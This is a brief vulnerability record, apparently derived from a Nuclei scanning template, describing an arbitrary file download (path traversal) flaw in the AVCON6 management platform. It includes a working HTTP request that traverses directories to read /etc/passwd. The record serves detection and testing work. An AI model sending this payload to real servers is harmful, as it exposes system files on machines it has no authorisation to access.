# Vulnerability: AVCON6 org_execl_download.action - Arbitrary File Download
**Classification:** CWE-23,CWE-73
**Source:** Nuclei Template (`avcon6-execl-lfi.yaml`)

## Description
Arbitrary File Download vulnerability in the org_execl_download.action of the AVCON6 system management platform, through which an attacker can download arbitrary files from the server

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/org_execl_download.action?filename=../../../../../../../../../../../../../etc/passwd
```

